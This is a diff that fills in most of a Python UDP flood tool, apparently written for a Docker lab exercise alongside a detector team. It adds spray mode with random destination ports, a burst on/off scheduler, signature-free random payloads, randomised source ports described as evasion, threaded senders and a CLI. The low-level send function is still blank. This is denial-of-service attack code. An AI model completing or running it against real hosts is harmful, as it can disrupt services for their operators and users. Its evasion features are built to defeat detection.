@@ -22,7 +22,7 @@ A3 — Evasion / CLI / JSON Stats Logging + udp_echo_server.py
 Integration owner: A1 (wires main()).
 Cross-team liaison with detector team: A3.
 """
-
+from os import urandom
 import argparse
 import json
 import random
@@ -55,7 +55,8 @@ def send_udp_packet(sock, target_ip, target_port, payload):
     A3's choose_source_port() randomisation is respected.
     Returns bytes_sent, or raises on socket error (caller logs).
     """
-    raise NotImplementedError("A1: implement low-level send.")
+
+    
 
 
 def rate_limit_sleep(target_pps, packets_in_window, window_started_at):
@@ -95,7 +96,9 @@ def run_flood_mode(args, stats_list, stop_event):
 
 def pick_random_port(low=1, high=65535):
     """Random destination port for spray mode. Owner: A2."""
-    raise NotImplementedError("A2: implement.")
+    return random.randint(low, high)
+
+
 
 
 def run_spray_mode(args, stats_list, stop_event):
@@ -104,7 +107,25 @@ def run_spray_mode(args, stats_list, stop_event):
     Owner: A2. Reuses sender_worker (A1) with a target_provider that
     randomises the dst port on each call.
     """
-    raise NotImplementedError("A2: implement spray mode.")
+    def target_provider():
+        port    = pick_random_port()             
+        payload = random_payload(args.payload_size)  
+        return args.target, port, payload
+    
+    threads = []
+    for i in range(args.threads):
+
+    
+        t = threading.Thread(
+                            target=sender_worker,
+                            args=(i,args, stats_list[i], stop_event, target_provider)
+            )
+        threads.append(t)
+        t.start()
+    for th in threads:
+        th.join()
+
+
 
 
 class BurstScheduler:
@@ -118,15 +139,30 @@ class BurstScheduler:
     """
 
     def __init__(self, burst_on: float, burst_off: float):
-        raise NotImplementedError("A2: implement.")
+        self.burst_on =burst_on
+        self.burst_off = burst_off
+        self.cycle = burst_on + burst_off
+        self.started_at = time.time()
+
+        
 
     def should_send_now(self) -> bool:
         """True during ON phase, False during pause."""
-        raise NotImplementedError("A2: implement.")
+        elapse = time.time() - self.started_at
+        postion_in_cycle = elapse % self.cycle # using mode to know the congrunt index 
+        return postion_in_cycle < self.burst_on
 
     def time_until_next_phase(self) -> float:
         """Helper so workers can sleep through the OFF phase cleanly."""
-        raise NotImplementedError("A2: implement.")
+        elapsed      = time.time() - self.started_at
+        pos_in_cycle = elapsed % self.cycle
+
+        if pos_in_cycle < self.burst_on:
+            
+            return self.burst_on - pos_in_cycle
+        else:
+        
+            return self.cycle - pos_in_cycle    
 
 
 def run_burst_mode(args, stats_list, stop_event):
@@ -134,7 +170,29 @@ def run_burst_mode(args, stats_list, stop_event):
     burst envelope wrapping flood (default) — and optionally spray
     if you decide to support burst-over-spray. Owner: A2.
     """
-    raise NotImplementedError("A2: implement burst mode.")
+    def target_provider():
+        if not scheduler.should_send_now():
+            time.sleep(scheduler.time_until_next_phase())
+            return None   # tells sender_worker: skip this iteration
+
+        payload = random_payload(args.payload_size)
+        return args.target, args.port, payload
+    
+
+    scheduler = BurstScheduler(args.burst_on,args.burst_off)
+    threads = []
+    for i in range(args.threads):
+        t = threading.Thread(
+            target=sender_worker,
+            args=(i, args, stats_list[i], stop_event, target_provider)
+        )
+        threads.append(t)
+        t.start()
+
+    for t in threads:
+        t.join()
+
+
 
 
 # ======================================================================
@@ -146,7 +204,9 @@ def random_payload(size: int) -> bytes:
     Random-content payload of exactly `size` bytes — no fixed signature.
     Owner: A3.
     """
-    raise NotImplementedError("A3: implement.")
+    if size <= 0:
+        return b""
+    return urandom(size)
 
 
 def choose_source_port(low=1024, high=65535) -> int:
@@ -154,7 +214,7 @@ def choose_source_port(low=1024, high=65535) -> int:
     Random ephemeral source port (caller binds the socket to it).
     Owner: A3. This is one half of the required evasion.
     """
-    raise NotImplementedError("A3: implement.")
+    return random.randint(low, high)
 
 
 def build_argparser() -> argparse.ArgumentParser:
@@ -166,8 +226,23 @@ def build_argparser() -> argparse.ArgumentParser:
               --burst-on --burst-off --log
     Optional (nice to have): --spray-port-min --spray-port-max --seed
     """
-    raise NotImplementedError("A3: implement argparser.")
+    parser = argparse.ArgumentParser(
+        prog="udp_flooder.py",
+        description="UDP flooder — use inside Docker lab only.",
+    )
 
+    parser.add_argument("--target",       required=True,             help="Target IP address.")
+    parser.add_argument("--port",         type=int, default=9999,    help="Destination UDP port (default: 9999).")
+    parser.add_argument("--mode",         choices=["flood","spray","burst"], default="flood", help="Attack mode.")
+    parser.add_argument("--rate",         type=int, default=100,     help="Packets per second per thread (default: 100).")
+    parser.add_argument("--payload-size", type=int, default=512,     dest="payload_size", help="Payload size in bytes (default: 512).")
+    parser.add_argument("--threads",      type=int, default=1,       help="Number of sender threads (default: 1).")
+    parser.add_argument("--duration",     type=float, default=0.0,   help="Seconds to run, 0 = run until Ctrl+C (default: 0).")
+    parser.add_argument("--burst-on",     type=float, default=3.0,   dest="burst_on",  help="Seconds of fast sending per burst (default: 3.0).")
+    parser.add_argument("--burst-off",    type=float, default=5.0,   dest="burst_off", help="Seconds of silence between bursts (default: 5.0).")
+    parser.add_argument("--log",          default="flooder_stats.json", help="Path to the JSON log file (default: flooder_stats.json).")
+
+    return parser
 
 class JsonStatsLogger:
     """
@@ -179,22 +254,35 @@ class JsonStatsLogger:
     """
 
     def __init__(self, path: Path):
-        raise NotImplementedError("A3: implement.")
+        self._file = Path(path).open("a", encoding="utf-8")
 
     def write(self, record: dict) -> None:
-        raise NotImplementedError("A3: implement.")
+        self._file.write(json.dumps(record) + "\n")
+        self._file.flush()
 
     def close(self) -> None:
-        raise NotImplementedError("A3: implement.")
+        self._file.close()
 
 
-def write_stats_snapshot(logger: "JsonStatsLogger", args, stats_list):
-    """
-    Aggregate every ThreadStats in `stats_list` and emit one JSON line.
-    Owner: A3. Typically called from a small reporter thread every 1s.
-    """
-    raise NotImplementedError("A3: implement.")
 
+def write_stats_snapshot(logger, args, stats_list):
+    total_packets = sum(s.packets_sent for s in stats_list)
+    total_bytes   = sum(s.bytes_sent   for s in stats_list)
+    elapsed       = time.time() - min(s.started_at for s in stats_list) if stats_list else 0
+    measured_pps  = round(total_packets / elapsed, 2) if elapsed > 0 else 0.0
+
+    now = datetime.now(timezone.utc)          # ← call once, use twice
+    ts  = now.strftime("%Y-%m-%dT%H:%M:%S.") + f"{now.microsecond // 1000:03d}Z"
+
+    record = {
+        "ts":           ts,
+        "target":       args.target,
+        "mode":         args.mode,
+        "packets_sent": total_packets,
+        "bytes_sent":   total_bytes,
+        "measured_pps": measured_pps,
+    }
+    logger.write(record)
 
 # ======================================================================
 # MAIN — dispatch by --mode                             (Owner: A1)
